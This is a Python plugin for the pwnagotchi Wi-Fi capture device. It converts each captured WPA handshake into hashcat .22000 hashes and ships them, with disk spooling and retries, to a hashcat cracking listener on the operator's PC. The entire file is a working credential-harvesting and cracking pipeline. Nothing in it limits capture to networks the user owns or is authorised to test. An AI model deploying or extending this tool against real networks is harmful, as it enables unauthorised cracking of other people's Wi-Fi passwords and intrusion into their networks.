# coco2_hashcat_bridge.py — a pwnagotchi plugin
#
# The moment a captured handshake actually contains a crackable WPA hash,
# this plugin converts it with hcxpcapngtool and ships the .22000 line
# straight to a hashcat listener running on the host PC (the Legion).
# Undeliverable hashes are spooled on disk and retried, so nothing is
# lost when the PC is asleep or the link is down.
#
# Only complete handshakes produce a hash — partial AP-side captures
# (M1/M3 only) convert to nothing and are skipped by design.
#
# Config (config.toml):
#   main.plugins.coco2_hashcat_bridge.enabled = true
#   main.plugins.coco2_hashcat_bridge.legion_url = "http://10.0.0.1:8765/submit"
#   main.plugins.coco2_hashcat_bridge.token = "YOUR_TOKEN"
#   main.plugins.coco2_hashcat_bridge.hcxpcapngtool = "/usr/local/bin/hcxpcapngtool"

import json
import logging
import os
import subprocess
import threading

import requests

import pwnagotchi.plugins as plugins


class Coco2HashcatBridge(plugins.Plugin):
    __author__ = 'Cocopoko'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = ('Converts new handshakes with hcxpcapngtool and ships every crackable '
                       'WPA hash (.22000) straight to a hashcat listener on the host PC. '
                       'Hashes that cannot be delivered are spooled and retried.')

    DEFAULT_URL = 'http://10.0.0.1:8765/submit'
    DEFAULT_HCX = '/usr/local/bin/hcxpcapngtool'
    SPOOL_DIR = '/root/hashcat-bridge'

    def __init__(self):
        self._lock = threading.Lock()
        self._spool_file = os.path.join(self.SPOOL_DIR, 'spool.jsonl')
        self._sent_file = os.path.join(self.SPOOL_DIR, 'sent.txt')

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------
    def _opt(self, key, default=None):
        try:
            return self.options.get(key, default)
        except Exception:
            return default

    def _load_seen(self):
        """Hashes already delivered or already waiting in the spool."""
        seen = set()
        try:
            with open(self._sent_file) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        seen.add(line)
        except Exception:
            pass
        try:
            with open(self._spool_file) as f:
                for line in f:
                    try:
                        seen.add(json.loads(line)['hash'])
                    except Exception:
                        continue
        except Exception:
            pass
        return seen

    def _spool(self, entry):
        with self._lock:
            with open(self._spool_file, 'a') as f:
                f.write(json.dumps(entry) + '\n')

    def _deliver(self, entry):
        url = self._opt('legion_url', self.DEFAULT_URL)
        token = self._opt('token', '')
        headers = {'Content-Type': 'application/json'}
        if token:
            headers['X-Bridge-Token'] = token
        r = requests.post(url, json=entry, headers=headers, timeout=10)
        return r.status_code == 200

    def _flush_spool(self):
        """Try to deliver everything spooled; keep only what still fails."""
        with self._lock:
            if not os.path.exists(self._spool_file):
                return
            try:
                with open(self._spool_file) as f:
                    entries = [json.loads(l) for l in f if l.strip()]
            except Exception:
                return
        delivered = []
        for entry in entries:
            try:
                ok = self._deliver(entry)
            except Exception as e:
                logging.debug('[hashcat-bridge] delivery failed (%s), keeping in spool' % e)
                ok = False
            if ok:
                delivered.append(entry['hash'])
                logging.info('[hashcat-bridge] delivered hash for %s' % entry.get('ssid'))
        if not delivered:
            return
        done = set(delivered)
        with self._lock:
            with open(self._sent_file, 'a') as f:
                for h in delivered:
                    f.write(h + '\n')
            # re-read the spool (new entries may have arrived) and drop
            # only the ones confirmed delivered
            try:
                with open(self._spool_file) as f:
                    current = [json.loads(l) for l in f if l.strip()]
            except Exception:
                current = []
            keep = [e for e in current if e.get('hash') not in done]
            with open(self._spool_file, 'w') as f:
                for e in keep:
                    f.write(json.dumps(e) + '\n')

    def _process_pcap(self, pcap_path, ssid):
        hcx = self._opt('hcxpcapngtool', self.DEFAULT_HCX)
        if not os.path.exists(hcx):
            logging.warning('[hashcat-bridge] hcxpcapngtool not found at %s' % hcx)
            return
        out = pcap_path + '.bridge.22000'
        try:
            subprocess.run([hcx, '-o', out, pcap_path],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=120)
        except Exception as e:
            logging.error('[hashcat-bridge] conversion failed: %s' % e)
            return
        if not os.path.exists(out):
            return  # partial handshake — nothing crackable in it
        try:
            with open(out) as f:
                hashes = [l.strip() for l in f if l.strip().startswith('WPA*')]
        finally:
            try:
                os.remove(out)
            except Exception:
                pass
        if not hashes:
            return
        seen = self._load_seen()
        new = 0
        for h in hashes:
            if h in seen:
                continue
            self._spool({'ssid': ssid, 'hash': h,
                         'source': os.path.basename(pcap_path)})
            seen.add(h)
            new += 1
        if new:
            logging.info('[hashcat-bridge] %d new crackable hash(es) for %s — delivering'
                         % (new, ssid))
            self._flush_spool()

    # ------------------------------------------------------------------
    # plugin lifecycle
    # ------------------------------------------------------------------
    def on_loaded(self):
        try:
            os.makedirs(self.SPOOL_DIR, exist_ok=True)
        except Exception:
            pass
        logging.info('[hashcat-bridge] loaded, legion url: %s'
                     % self._opt('legion_url', self.DEFAULT_URL))

    def on_ready(self, agent):
        self._flush_spool()

    def on_handshake(self, agent, filename, access_point, client_station):
        ssid = ''
        try:
            ssid = access_point.get('hostname') or access_point.get('ssid') or ''
        except Exception:
            pass
        threading.Thread(target=self._process_pcap,
                         args=(filename, ssid), daemon=True).start()

    def on_internet_available(self, agent):
        self._flush_spool()
